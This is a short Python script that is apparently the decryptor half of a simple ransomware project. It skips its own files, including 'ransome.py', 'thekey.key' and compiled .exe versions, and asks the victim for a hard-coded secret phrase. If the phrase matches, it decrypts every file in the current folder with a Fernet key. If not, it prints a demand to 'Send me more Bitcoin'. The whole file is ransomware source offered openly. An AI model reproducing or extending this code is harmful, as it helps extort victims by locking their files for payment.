import os
from cryptography.fernet import Fernet




files = []

for file in os.listdir():
	if file == "ransome.py" or file == "thekey.key" or file == "decrypt.py" or file== "ransome.exe" or file == "decrypt.exe":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)


with open("thekey.key", "rb") as key:
	secretkey = key.read()


secretphrase = "perpendicular"

user_phrase = input("Enter the secret phrase to decrypt the file: \n")

if user_phrase == secretphrase:
	for file in files:
		with open(file,"rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
	print("Congrats!, Your file has been decrypted. Enjoy your day!!")
else:
	print("Sorry!!, wrong secret phrase. Send me more Bitcoin")

input()